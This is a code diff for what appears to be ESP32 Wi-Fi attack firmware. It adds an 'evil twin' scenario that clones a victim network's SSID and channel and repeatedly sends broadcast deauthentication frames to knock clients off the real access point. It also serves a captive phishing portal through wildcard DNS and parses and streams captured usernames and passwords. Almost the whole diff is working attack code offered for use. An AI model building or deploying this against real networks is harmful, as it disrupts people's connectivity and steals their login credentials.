@@ -100,7 +100,7 @@ void releaseUsbRadioIfIdle() {
 // AP. Only AP clients may be shadowed; USB and Serial remain control channels.
 // Beacon/deauth require `ap on`. The portal owns a temporary AP via wifiAp and
 // restores the prior radio when it stops.
-enum class WifiAttack : uint8_t { None, Beacon, DeauthTarget, DeauthFlood, EvilPortal };
+enum class WifiAttack : uint8_t { None, Beacon, DeauthTarget, DeauthFlood, EvilPortal, EvilTwin };
 WifiAttack attack = WifiAttack::None;
 bool attackActive = false;
 uint32_t attackTicket = 0;
@@ -163,6 +163,14 @@ std::string resolvePortalPage() {
     Serial.printf("evil portal: %s missing or unusable — using built-in page\n", evilTwin::kPagePath);
     return evilTwin::defaultPage();
 }
+
+// wifi_evil_twin — Plan-driven scenario orchestrator (PLAN §13). Distinct entry
+// point from wifi_evil_portal: requires ssid+bssid+channel and sequences clone
+// AP -> portal -> targeted deauth of the victim BSSID on the clone's channel via
+// evilTwin::Plan. Reuses the portal AP (startTwin==beginPortal), page resolution,
+// DNS and credential capture; no channel hopping (twin and deauth share it).
+evilTwin::Plan twinPlan;
+uint32_t twinCaptures = 0; // credential POSTs captured this run
 #endif
 
 // The promiscuous RX callback runs on the WiFi task. Disabling promiscuous RX
@@ -648,12 +656,130 @@ void stepPortal(uint32_t now) {
 }
 
 
+void failEvilTwin(uint32_t now, const char *detail) {
+    // Tear down anything the scenario brought up, then fail once. stopTwin()
+    // (endPortal) restores the admin AP even if the clone disturbed the radio.
+    if (portalDnsActive) {
+        portalDns.stop();
+        portalDnsActive = false;
+    }
+    webDashboard::disableEvilPortal();
+    wifiAp::stopTwin();
+    twinPlan.fail(now);
+    runtime.setHealth(false, detail, now);
+    runtime.failAction(attackTicket, ActionError::HardwareError, now, true);
+    attackTicket = 0;
+    attackActive = false;
+    attack = WifiAttack::None;
+}
+
+// Drains captured credential POSTs and streams them as kind="evil_twin". Mirrors
+// stepPortal's capture handling (same parseFormCredentials + raw-body shrink to
+// fit the output cap) but under the scenario's own frame kind.
+void drainTwinCaptures(uint32_t now) {
+    std::string body;
+    uint32_t sequence = 0;
+    while (webDashboard::takePortalCapture(body, sequence)) {
+        ++twinCaptures;
+        JsonDocument doc;
+        doc["kind"] = "evil_twin";
+        doc["event"] = "capture";
+        doc["capture"] = sequence;
+        doc["captures"] = twinCaptures;
+        evilTwin::Credentials creds;
+        const bool found = evilTwin::parseFormCredentials(body, creds);
+        doc["user"] = found && creds.hasUser ? creds.user : nullptr;
+        doc["pass"] = found && creds.hasPass ? creds.pass : nullptr;
+        constexpr size_t kRawBodyBytes = 160;
+        std::string raw = body.size() > kRawBodyBytes ? body.substr(0, kRawBodyBytes) : body;
+        doc["body"] = raw;
+        doc["bodyTruncated"] = body.size() > kRawBodyBytes;
+        std::string payload;
+        while (true) {
+            serializeJson(doc, payload);
+            if (payload.size() <= kMaxActionOutputBytes) break;
+            if (raw.empty()) break;
+            raw.resize(raw.size() / 2);
+            doc["body"] = raw;
+        }
+        runtime.publishOutput(attackTicket, std::move(payload), now);
+        body.clear();
+    }
+}
+
+void stepEvilTwin(uint32_t now) {
+    switch (twinPlan.step(now)) {
+    case evilTwin::Step::StartTwinAp: {
+        const evilTwin::Config &cfg = twinPlan.config();
+        if (!wifiAp::startTwin(std::string(cfg.ssid, cfg.ssidLen), cfg.channel)) {
+            failEvilTwin(now, "evil twin clone AP failed");
+            return;
+        }
+        attackChannel = cfg.channel;
+        if (!portalDns.start(53, "*", WiFi.softAPIP())) {
+            failEvilTwin(now, "evil twin DNS failed");
+            return;
+        }
+        portalDnsActive = true;
+        webDashboard::enableEvilPortal(resolvePortalPage());
+        twinPlan.apReady(now);
+        // Start status frame: what the scenario is running.
+        JsonDocument doc;
+        doc["kind"] = "evil_twin";
+        doc["event"] = "status";
+        doc["phase"] = "running";
+        doc["ssid"] = cfg.ssid; // NUL-terminated, lives in twinPlan.config_ (persistent)
+        doc["channel"] = cfg.channel;
+        char bssidText[wifiAttack::kMacTextBytes];
+        wifiAttack::formatMac(cfg.bssid, bssidText, sizeof(bssidText));
+        doc["bssid"] = bssidText;
+        doc["page"] = portalPageFromFile ? evilTwin::kPagePath : "builtin";
+        publishAttackJson(doc, now);
+        return;
+    }
+    case evilTwin::Step::SendDeauth: {
+        // Deauth every client of the victim BSSID (broadcast dest, victim BSSID
+        // as src/bssid) on the clone's own channel — no set_channel, which would
+        // move the clone off its channel. Three frames per burst (one is lossy).
+        const evilTwin::Config &cfg = twinPlan.config();
+        for (int i = 0; i < 3; ++i) {
+            const size_t length = wifiAttack::buildDeauth(wifiAttack::kBroadcastMac, cfg.bssid, cfg.bssid,
+                                                          cfg.deauthReason, txFrame, sizeof(txFrame));
+            if (length != 0 && sendRawFrame(txFrame, length)) ++attackCount;
+        }
+        break;
+    }
+    case evilTwin::Step::None:
+    case evilTwin::Step::Publish:
+    default:
+        break;
+    }
+
+    // Portal + captures run every poll once the clone is up.
+    if (portalDnsActive) portalDns.processNextRequest();
+    drainTwinCaptures(now);
+
+    if (static_cast<uint32_t>(now - lastAttackPublishMs) < kMinSniffSampleMs) return;
+    lastAttackPublishMs = now;
+    JsonDocument doc;
+    doc["kind"] = "evil_twin";
+    doc["event"] = "status";
+    doc["phase"] = (twinPlan.phase() == evilTwin::Phase::Running) ? "running" : "cloning";
+    doc["channel"] = attackChannel;
+    doc["deauthBursts"] = twinPlan.deauthBursts();
+    doc["deauthSent"] = attackCount;
+    doc["captures"] = twinCaptures;
+    doc["elapsedMs"] = now - attackStartMs;
+    publishAttackJson(doc, now);
+}
+
 void stepAttack(uint32_t now) {
     switch (attack) {
     case WifiAttack::Beacon: stepBeacon(now); break;
     case WifiAttack::DeauthTarget: stepDeauthTarget(now); break;
     case WifiAttack::DeauthFlood: stepDeauthFlood(now); break;
     case WifiAttack::EvilPortal: stepPortal(now); break;
+    case WifiAttack::EvilTwin: stepEvilTwin(now); break;
     case WifiAttack::None: break;
     }
 }
@@ -665,6 +791,8 @@ void stopAttack() {
     }
     webDashboard::disableEvilPortal();
     // Restore the pre-portal AP/radio without changing the operator's AP intent.
+    // endPortal() also restores the admin AP for the evil-twin scenario, which
+    // took the same portal AP via wifiAp::startTwin().
     wifiAp::endPortal();
     portalCloned = false;
     // Drop the companion deauth with the portal: no frames may outlive the AP
@@ -672,6 +800,9 @@ void stopAttack() {
     portalDeauth = evilTwin::DeauthPlan{};
     portalDeauthSent = 0;
     lastPortalDeauthMs = 0;
+    // Reset the evil-twin scenario state so the next run starts clean.
+    twinPlan.stop(millis());
+    twinCaptures = 0;
     if (floodScanInFlight) esp_wifi_scan_stop();
     WiFi.scanDelete();
     floodScanInFlight = false;
@@ -688,7 +819,9 @@ void stopAttack() {
 }
 
 CommandError startAttack(ActionId action, const ActionParams &params, const ActionDescriptor &descriptor) {
-    if (action != ActionId::WifiEvilPortal && !apInterfaceUp()) {
+    // Evil portal and evil twin own their AP via wifiAp (clone brought up from
+    // USB-only too), so they do not require `ap on` first; raw-TX payloads do.
+    if (action != ActionId::WifiEvilPortal && action != ActionId::WifiEvilTwin && !apInterfaceUp()) {
         runtime.setHealth(false, "ap not active", millis());
         return CommandError::HardwareError;
     }
@@ -766,6 +899,32 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
                                        params.present(6) ? params.integer(6) : 100, portalDeauth)) {
             return CommandError::InvalidParams;
         }
+    } else if (action == ActionId::WifiEvilTwin) {
+        kind = WifiAttack::EvilTwin;
+        evilTwin::Config cfg{};
+        const std::string_view ssid(params.string(0), params.stringLength(0)); // required
+        if (!evilTwin::cloneSsidUsable(ssid)) return CommandError::InvalidParams;
+        std::memcpy(cfg.ssid, ssid.data(), ssid.size());
+        cfg.ssid[ssid.size()] = '\0';
+        cfg.ssidLen = ssid.size();
+        if (!wifiAttack::parseMac(std::string_view(params.string(1), params.stringLength(1)), cfg.bssid)) {
+            return CommandError::InvalidParams; // required victim BSSID
+        }
+        const int64_t channel = params.integer(2); // required
+        if (!evilTwin::channelUsable(channel)) return CommandError::InvalidParams;
+        cfg.channel = static_cast<uint8_t>(channel);
+        cfg.deauthReason = 1;
+        if (params.present(3)) {
+            int64_t reason = params.integer(3);
+            if (reason < 1) reason = 1;
+            if (reason > 65535) reason = 65535;
+            cfg.deauthReason = static_cast<uint16_t>(reason);
+        }
+        cfg.deauthIntervalMs = params.present(4) ? clampInterval(params.integer(4)) : 100;
+        // begin() re-validates + clamps; the clone AP, portal and deauth are
+        // driven from poll() via stepEvilTwin(), not here.
+        if (!twinPlan.begin(cfg, millis())) return CommandError::InvalidParams;
+        twinCaptures = 0;
     } else {
         return CommandError::UnsupportedAction;
     }
@@ -787,7 +946,9 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
     }
     wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
     esp_wifi_get_channel(&attackChannel, &second);
-    if (kind != WifiAttack::EvilPortal) savedChannel = attackChannel;
+    // Portal and evil twin own their AP/channel snapshot via wifiAp; only raw-TX
+    // payloads restore the pre-attack channel on stop.
+    if (kind != WifiAttack::EvilPortal && kind != WifiAttack::EvilTwin) savedChannel = attackChannel;
 
     uint32_t ticket = 0;
     const CommandError error = runtime.beginAction(millis(), 0, ticket, descriptor); // Continuous, no deadline
@@ -846,6 +1007,10 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
         runtime.publishOutput(attackTicket, std::move(payload), attackStartMs);
         break;
     }
+    case WifiAttack::EvilTwin:
+        // Plan already begun in the parse step; the clone AP, portal and deauth
+        // are brought up from the first poll in stepEvilTwin().
+        break;
     case WifiAttack::None: break;
     }
     return CommandError::None;
@@ -921,7 +1086,8 @@ CommandError setEnabled(bool enabled) {
 
 CommandError handleAction(ActionId action, const ActionParams &params) {
 #ifdef ENABLE_DISRUPTIVE
-    if (action == ActionId::WifiBeacon || action == ActionId::WifiDeauth || action == ActionId::WifiEvilPortal) {
+    if (action == ActionId::WifiBeacon || action == ActionId::WifiDeauth || action == ActionId::WifiEvilPortal ||
+        action == ActionId::WifiEvilTwin) {
         const ActionDescriptor *disruptiveDescriptor = catalog::findAction(ModuleId::Wifi, action);
         if (disruptiveDescriptor == nullptr) return CommandError::UnsupportedAction;
         return startAttack(action, params, *disruptiveDescriptor);
